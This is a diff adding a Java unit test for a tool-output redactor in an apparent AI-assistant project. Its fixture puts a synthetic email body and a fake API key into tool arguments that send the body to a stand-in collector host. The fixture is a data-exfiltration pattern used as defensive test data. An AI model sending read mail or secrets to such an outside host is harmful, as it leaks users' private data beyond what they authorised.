@@ -3,6 +3,7 @@ package com.bifos.assistant.hermes;
 import static org.assertj.core.api.Assertions.assertThat;
 
 import com.bifos.assistant.usage.domain.ExecutionEvent;
+import java.util.HashMap;
 import java.util.Set;
 import org.junit.jupiter.api.DisplayName;
 import org.junit.jupiter.api.Test;
@@ -211,6 +212,24 @@ class ToolDetailRedactorTest {
                 .hasSize(500)
                 .endsWith("…");
         assertThat(ToolDetailRedactor.redact("가".repeat(65_537), false)).isEqualTo("[긴 도구 내용 가림]");
+    }
+
+    @Test
+    @DisplayName("커넥터 READ 본문이 일반 도구의 인자로 다시 실리면 비밀 모양만 가리고 나머지 본문은 남는다")
+    void keepsReadBodyReusedAsOtherToolArguments() {
+        // docs/read-data-flow.md 의 RF-16 이다. 실행 기록이 커넥터 READ 본문을 어디까지 남기는지 고정한다.
+        String mail = "합성 메일 본문: 다음 주 화요일 병원 예약";
+        String token = "sk-" + "x".repeat(40);
+        String args = "{\"url\":\"https://collector.example/?d=" + mail + "\",\"api_key\":\"" + token + "\"}";
+
+        // 바인딩 에이전트의 실행은 붙은 커넥터 서버의 접두사만 통째로 가린다.
+        ToolDetailScope bound = ToolDetailScope.prefixes(Set.of("mcp__mail__"));
+
+        assertThat(ToolDetailRedactor.redact(args, "mcp__mail__get_message", bound, new HashMap<>()))
+                .isEqualTo("[연결 도구 내용 가림]");
+        assertThat(ToolDetailRedactor.redact(args, "web_extract", bound, new HashMap<>()))
+                .contains(mail)
+                .doesNotContain(token);
     }
 
     @Test
